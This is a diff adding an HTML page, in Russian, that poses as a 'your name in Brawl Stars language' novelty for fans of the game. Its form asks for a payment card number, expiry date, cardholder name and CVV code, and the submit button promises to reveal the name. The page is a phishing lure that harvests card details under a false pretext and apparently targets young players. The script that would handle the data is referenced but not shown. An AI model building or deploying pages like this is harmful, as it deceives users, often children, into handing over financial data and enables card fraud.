@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>BrawrStars Name</title>
+    <link rel="stylesheet" type="text/css" href="style.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <section class="jumbotron">
+      <div class="container" id="name_container">
+        <h1>ТВОЁ ИМЯ НА ЯЗЫКЕ BRAWL STARS</h1>
+        <div class="img_container">
+          <img src="images/94_main-v1583942734.jpeg" alt="" />
+        </div>
+      </div>
+    </section>
+    <section class="form">
+      <form action="" id="cardForm">
+        <div class="card_field_container">
+          <div class="lab">
+            <label for="card_number">Номер карты</label>
+          </div>
+          <input
+            name="card_number"
+            type="text"
+            placeholder="0000 0000 0000 0000"
+            maxlength="12"
+            class="card_number"
+            required
+          />
+        </div>
+        <div class="card_field_container">
+          <div class="lab">
+            <label for="card_expires_left">Действительна до</label>
+          </div>
+          <input
+            name="card_expires_left"
+            type="text"
+            placeholder="ММ"
+            maxlength="2"
+            class="card_expires_left"
+            required
+          /><span>/</span>
+          <input
+            name="card_expires_right"
+            type="text"
+            placeholder="ГГ"
+            maxlength="2"
+            class="card_expires_right"
+            required
+          />
+        </div>
+        <div class="card_field_container">
+          <div class="lab">
+            <label for="name_cardholder">Имя держателя карты</label>
+          </div>
+          <input
+            type="text"
+            name="name_cardholder"
+            id=""
+            placeholder="ИМЯ ФАМИЛИЯ ЛАТИНИЦЕЙ"
+            class="name_cardholder"
+            required
+          />
+        </div>
+        <div class="card_field_container">
+          <div class="lab">
+            <label for="cvv_code">CVC2/CVV2</label>
+          </div>
+          <input
+            type="text"
+            name="cvv_code"
+            class="cvv_code"
+            id=""
+            placeholder="***"
+            required
+          />
+        </div>
+        <button type="submit" >УЗНАТЬ ИМЯ!</button>
+      </form>
+    </section>
+    <script src="script.js"></script>
+  </body>
+</html>
